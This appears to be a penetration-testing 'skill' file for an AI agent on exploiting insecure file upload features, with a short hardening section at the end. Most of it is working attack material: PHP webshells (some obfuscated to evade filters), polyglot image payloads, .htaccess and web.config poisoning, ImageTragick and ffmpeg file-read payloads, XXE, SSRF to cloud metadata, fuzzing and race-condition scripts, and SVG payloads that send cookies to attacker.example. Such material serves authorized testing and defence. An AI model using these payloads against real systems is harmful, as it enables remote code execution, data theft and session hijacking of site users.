---
name: file-upload
description: End-to-end methodology for discovering, bypassing, and exploiting insecure file upload endpoints (RCE, XSS, LFI, SSRF, cloud misconfig) plus hardening guidance.
---

# File Upload Exploitation

File upload is one of the highest-impact vulnerability classes: a single accepted malicious file can yield RCE, stored XSS, LFI, SSRF, or cloud takeover. This skill covers recon, a full bypass matrix, exploitation chains, cloud-specific abuse, automation, and remediation.

## When to use this skill

- You found an avatar/profile-picture/attachment/import feature and need to test it systematically.
- A target accepts files (images, PDFs, ZIPs, Office docs, SVG, CSV) and you must determine if execution or rendering is possible.
- You have direct-to-cloud uploads (S3/GCS/Azure pre-signed URLs) and need to test content-type/ACL restrictions.
- You suspect an upload endpoint the UI doesn't expose (XHR, base64 JSON, PUT/WebDAV).
- You need to chain upload → LFI, upload → SSRF, or upload → race-condition RCE.
- You are writing a remediation report and need concrete hardening controls.

## Methodology

### 1. Recon — locate and characterize upload endpoints

Enumerate every place a file can enter the application:

```html
<!-- HTML forms: look for enctype="multipart/form-data" -->
<form action="/api/avatar" method="POST" enctype="multipart/form-data">
  <input type="file" name="file" accept="image/png,image/jpeg">
</form>
```

- **XHR/Fetch multipart**: inspect JS bundles for `new FormData()` + `append("file", ...)`. The endpoint often differs from the UI form.
- **Base64 JSON bodies**: `{"filename":"a.png","data":"iVBORw0KGgo..."}` — decode, modify, re-encode. Server-side decode is where magic-byte checks live.
- **HTTP methods**: probe `OPTIONS /uploads/` for allowed verbs; try `PUT /uploads/shell.txt` directly (WebDAV, REST object stores).
- **WebDAV**: `PROPFIND /`, `PUT /test.txt`, check for `Dav: 1` header. If `PUT` works with `.txt`, test extensions.
- **Hidden params**: `dest`, `path`, `dir`, `folder`, `filename`, `name`, `url`, `file` — fuzz for path/URL control.
- **Import features**: CSV/XML importers, "restore backup", plugin/theme uploaders in admin panels — often skip validation.

Enumerate where files land:

```bash
# Response body often returns the URL directly
curl -s -X POST https://target/api/upload -F "file=@test.png" | jq .

# Guess common destinations
for p in uploads upload static media assets files attachments img images \
         user_content public storage tmp downloads; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target/$p/")
  echo "$code /$p/"
done
```

Check how files are served (critical for exploitation):

```bash
curl -sI https://target/uploads/legit.png
# Key headers: Content-Type, Content-Disposition, X-Content-Type-Options,
# Content-Security-Policy, Server (Apache/nginx/IIS version)
```

- Directory listing enabled (`Index of /uploads`) → instant file discovery + confirms web server.
- `Content-Type: image/png` forced → polyglot/EXIF routes needed.
- `Content-Disposition: attachment` → XSS harder, but still possible via sniffing gaps.
- Filename reflected in URL → test traversal/CRLF/null bytes in the filename parameter.

### 2. Bypass matrix — validation evasion

Work through this matrix systematically; most filters combine 2–3 checks (extension, MIME, magic bytes, re-encode).

**Extension blacklists** (server blocks `\.php$`):

| Original | Bypass candidates |
|---|---|
| `shell.php` | `shell.php5`, `shell.php7`, `shell.phtml`, `shell.phar`, `shell.pht`, `shell.inc`, `shell.shtml`, `shell.php.test` (Apache processes unknown final ext) |
| Case | `shell.Php`, `shell.PHP`, `shell.pHp` (Windows case-insensitive FS + Apache) |
| Trailing dot/space | `shell.php.`, `shell.php ` (Windows strips trailing dot/space) |
| Null byte (legacy) | `shell.php%00.jpg`, `shell.php\x00.jpg` (PHP <5.3.4, old nginx) |
| Double extension | `shell.jpg.php`, `shell.php.jpg` (Apache `AddHandler ... .php` executes `.php.jpg` — classic bug) |
| `.htaccess` | Upload `.htaccess` with `AddType application/x-httpd-php .png` → every `.png` in dir executes |
| IIS | `web.config` with `<handlers>` mapping `.aspx`; `shell.asp;.jpg` (semicolon truncation, IIS ≤7.5) |
| nginx off-by-slash | If uploads dir is aliased: `/uploads../secret.php` escapes the alias location block |

**Content-Type spoof** — keep the dangerous extension, lie about the MIME:

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET[0]); ?>
------WebKitFormBoundary--
```

**Magic bytes** — prepend valid headers to pass `getimagesize()` / `file` checks:

```bash
printf 'GIF89a<?php system($_GET[0]); ?>' > shell.gif
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR<?php system($_GET[0]); ?>' > shell.png
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET[0]); ?>' > shell.jpg
```

**Polyglot images** — payload survives re-encoding by hiding in metadata:

```bash
# PHP in EXIF comment (survives getimagesize and most re-encoders that keep EXIF)
exiftool -Comment='<?php system($_GET[0]); ?>' legit.jpg -o shell.jpg
# GIF payload in comment block
printf 'GIF89a\x21\xFE<?php system($_GET[0]); ?>\x00' > shell.gif
# True polyglot: valid JPEG AND valid PHP (payload after EOI marker)
cat legit.jpg shell.php > polyglot.jpg   # parsers stop at FFD9, PHP reads to EOF
```

**SVG — stored XSS** (SVG is XML; served inline = script executes):

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>fetch('https://attacker.example/?c='+document.cookie)</script>
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
    <img src=x onerror="fetch('//attacker.example/'+document.cookie)">
  </body></foreignObject>
</svg>
```

**Path traversal / injection in filename**:

```
../../shell.php          → escapes storage dir into webroot
..%2f..%2fshell.php      → URL-encoded traversal
....//....//shell.php    → naive filter stripping
shell.php%00.jpg         → null byte (legacy)
shell.php\r\nX-Injected: 1  → CRLF in filename → header/response splitting
shell.php::$DATA         → Windows NTFS Alternate Data Stream (IIS/ASP classic)
shell.php:.jpg           → NTFS ADS variant, saves as shell.php
shell.ph\u0070           → unicode/overlong UTF-8 normalization tricks
shell.php%20             → trailing space, Windows strips
```

**Server config poisoning**:

```apache
# .htaccess (Apache with AllowOverride All)
AddType application/x-httpd-php .png
php_value auto_prepend_file /var/www/html/uploads/shell.png
```

```xml
<!-- web.config (IIS) -->
<configuration>
  <system.webServer>
    <handlers>
      <add name="x" path="*.png" verb="*" type="System.Web.UI.PageHandlerFactory"/>
    </handlers>
  </system.webServer>
</configuration>
```

### 3. Exploitation chains

**Webshell → RCE.** Minimal, WAF-evading variants:

```php
<?php system($_GET[0]); ?>          // classic
<?=system($_GET[0])?>               // short tags, no "php" string
<?php eval(base64_decode($_GET[0]));?>
<?php $f=$_GET[0]; assert($f); ?>   // assert() as eval pre-PHP8
<?php preg_replace('/a/e', $_GET[0], 'a'); ?>  // /e modifier pre-PHP7
<?php create_function('', $_GET[0]); ?>         // pre-PHP8
<?php $s=strrev('metsys'); $s($_GET[0]); ?>     // string-built function names
<?php eval(gzinflate(base64_decode($_POST[0])));?>  // layered payload
```

Confirm execution: `curl "https://target/uploads/shell.php?0=id"`.

**Race condition upload** — file is validated then deleted/moved asynchronously; win the window:

```python
import threading, requests
def hit():
    while True:
        r = requests.get("https://target/uploads/shell.php")
        if r.status_code == 200: print("RCE!"); break
for _ in range(50): threading.Thread(target=hit).start()
requests.post("https://target/upload", files={"f": ("big.png", b"A"*50_000_000)})
```

**Upload → LFI chain**: upload a file with a known path, then feed that path to any LFI sink with wrappers:

```
?file=php://filter/convert.base64-encode/resource=/uploads/shell.png
?file=zip:///var/www/html/uploads/archive.zip#shell.php
?file=phar:///uploads/evil.phar/test.txt   # phar deserialization (POP chain)
```

**ImageTragick** (ImageMagick < 6.9.3-9 / CVE-2016-3714) — upload `.mvg`/`.svg`/`.png`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.example/1.jpg"|id > /var/www/html/uploads/pwned.txt)'
pop graphic-context
```

Delegates abuse: `.mvg` → `https:` delegate → command injection. Also `.ps`/`.eps` (Ghostscript) and `.mp4` (ffmpeg).

**ffmpeg HLS local file read** — upload `.m3u8` playlist:

```
#EXTM3U
#EXT-X-MEDIA-TYPE:DATA
#EXT-X-VERSION:7
#EXTINF:1.0,
#EXT-X-TARGETDURATION:1
#EXT-X-MAP:URI="/etc/passwd"
#EXTINF:1.0,
#EXT-X-STREAM-INF:BANDWIDTH=1
/etc/passwd
```

Server transcodes and leaks the file into the output video/frames.

**SSRF via remote URL fetch**: many uploaders accept `?url=https://...` to fetch-and-store. Point at `http://169.254.169.254/latest/meta-data/` (AWS IMDS), `http://localhost:8080/`, or `file:///etc/passwd` if scheme not restricted.

**SVG + XXE**: SVG is XML — if parsed server-side (thumbnail generation):

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

**Office/PDF client-side**: PDF with embedded JS (`/OpenAction` → `app.launchURL`) for phishing; Excel/CSV formula injection (`=HYPERLINK("http://attacker","x")`, `=cmd|'/c calc'!A1`) for downstream users who open exported files.

### 4. Cloud / direct-upload abuse

- **Pre-signed URL abuse**: pre-signed PUT URLs often omit content-type/size constraints. Request a URL for `image/png`, then PUT `text/html` with the same signature if the signature doesn't bind the Content-Type header. Test `Content-Type: text/html` on a `.html`/`.svg` key → stored XSS served from the bucket domain.
- **S3/GCS content-type restriction bypass**: if MIME is validated client-side only, or the bucket serves `Content-Type` from object metadata — upload `shell.svg` with `Content-Type: image/svg+xml` → XSS on the bucket origin (same-origin as app if bucket is on a subdomain).
- **Bucket ACL to public**: check if `x-amz-acl: public-read` is honored on PUT; test listing (`?list-type=2`) and bucket policy misconfig.
- **Service worker upload**: if the app registers a service worker from an upload path, an attacker-uploaded JS file becomes a persistent MITM — check `navigator.serviceWorker.register()` scope.
- **Key/path control**: pre-signed URLs with user-controlled key → `../` in object key to overwrite other objects (`key=../../index.html`).

### 5. Automation

**Python multipart template with proxy:**

```python
import requests

PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
URL = "https://target/api/upload"

def try_upload(filename, content, ctype="image/jpeg"):
    files = {"file": (filename, content, ctype)}
    r = requests.post(URL, files=files, proxies=PROXY, verify=False)
    print(f"{filename:40s} -> {r.status_code} {r.text[:120]}")
    return r

payload = b"GIF89a<?php system($_GET[0]); ?>"
exts = ["php", "php5", "php7", "phtml", "phar", "pht", "shtml", "inc",
        "Php", "PHP", "php.", "php ", "php.jpg", "jpg.php", "php%00.jpg",
        "php::$DATA", "php:.jpg", "php\r\n"]
for ext in exts:
    try_upload(f"shell.{ext}", payload)
    try_upload(f"shell.{ext}", payload, ctype="image/png")
```

**Burp Intruder**: capture the upload request, position `filename="§shell.php§"` and `Content-Type: §image/jpeg§` as payload positions. Load extension lists from fuzzdb (`fuzzdb/attack/file-upload/`) or SecLists (`Discovery/Filename`). Grep-match responses for `uploads/`, `saved`, `success`, and the returned URL.

**Upload scanner** — after upload, probe the returned path for execution:

```bash
for f in shell.php shell.phtml shell.php5 shell.gif; do
  url=$(curl -s -F "file=@$f" https://target/upload | grep -oP 'https://[^"]+/\S+')
  [ -n "$url" ] && curl -s "$url?0=id" | head -1
done
```

### 6. Remediation

- **Extension allowlist** (never blacklist): `['png','jpg','jpeg','gif','pdf']` — validate lowercase against the allowlist, final extension only.
- **Re-encode images**: decode with Pillow/ImageMagick and re-encode to strip EXIF/COM/metadata and destroy polyglots:

```python
from PIL import Image
img = Image.open(uploaded).convert("RGB")
img.save(out_path, "PNG")   # strips all metadata, breaks PHP polyglots
```

- **Random filenames**: `uuid4().hex + ".png"` — never use user-supplied names; kills traversal, ADS, CRLF, and overwrite attacks.
- **Fixed non-executable storage**: store outside webroot (e.g. `/var/lib/app-uploads/`) served via a controller, or a dedicated bucket/CDN with forced `Content-Type` and no script handlers.
- **Response headers on served files**: `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment`, `Content-Security-Policy: default-src 'none'`, `Cache-Control: no-store`.
- **Disable script handlers in upload dirs**: Apache `<Directory /uploads> php_admin_flag engine off </Directory>`; nginx `location /uploads/` with no fastcgi pass; IIS remove `.aspx` handler mapping for the dir.
- **SVG**: serve with `Content-Security-Policy: script-src 'none'`, sanitize with DOMPurify/allowlist, or convert to PNG server-side.
- **Archive inspection**: extract ZIPs with path containment against zip-slip (`os.path.realpath` check), scan with ClamAV, reject nested archives, limit extraction size.
- **Cloud**: bind Content-Type and Content-Length into the pre-signed signature; force `Content-Disposition: attachment` via bucket policy; serve uploads from a separate domain (not a subdomain sharing cookies); block public ACLs with SCP/organization policy.
- **Rate-limit + async AV scan**, quarantine on detection, log filename + hash + source IP.

## Verification & Deliverables

**PoC** — minimal evidence chain for the report:

```bash
# 1. Upload bypassed filter
curl -s -X POST https://target/api/upload \
  -F "file=@shell.gif;type=image/gif" | jq -r .url

# 2. Confirm execution
curl -s "https://target/uploads/shell.gif?0=id;uname -a"

# 3. Stored XSS (SVG)
curl -s -X POST https://target/api/upload -F "file=@xss.svg;type=image/svg+xml"
# then visit the returned URL in a browser; confirm cookie exfil to attacker listener
```

**Impact statement template**: "Unauthenticated file upload at `/api/upload` accepts `.php` files via content-type spoofing. Uploaded files are served from `/uploads/` with `Content-Type: application/x-httpd-php`, yielding unauthenticated remote code execution as `www-data`. Attacker can read `/etc/passwd`, dump the application database, and pivot to internal services."

**Remediation verification**: re-test with the full bypass matrix (all extensions × MIME × magic bytes × traversal × polyglot); confirm uploaded files are served with `nosniff` + `attachment` + random names; confirm no script execution from the storage path; confirm re-encoding strips EXIF payloads; confirm zip-slip is blocked on archive import.

**Deliverables**: bypass matrix table with which payloads succeeded; screenshot of RCE (`id` output); SVG XSS proof; cloud bucket misconfig evidence (if applicable); prioritized remediation list mapped to each finding.
